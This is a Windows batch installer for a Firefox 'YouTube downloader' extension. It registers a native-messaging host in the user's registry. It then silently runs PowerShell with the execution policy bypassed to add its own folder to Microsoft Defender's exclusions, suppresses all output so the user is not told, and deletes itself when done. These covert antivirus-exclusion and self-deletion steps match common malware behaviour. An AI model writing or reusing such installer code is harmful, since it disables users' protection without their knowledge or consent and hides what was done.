@echo off

:: Add the registry key
echo Adding registry key for the Firefox extension...
set "REG_PATH=HKCU\Software\Mozilla\NativeMessagingHosts\com.sacha.youtubedownloader"
set "DIR=%~dp0"
set "JSON_PATH=%DIR:~0,-1%\native-messaging.json"
reg add "%REG_PATH%" /ve /t REG_SZ /d "%JSON_PATH%" /f

if %ERRORLEVEL% neq 0 (
    echo Failed to add registry key.
    pause
    goto end
)

echo Registry key added successfully.

:: Exclude the entire extension folder from Defender
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1

echo Setup completed successfully.

pause
start /b "" cmd /c del "%~f0"&exit /b

:end
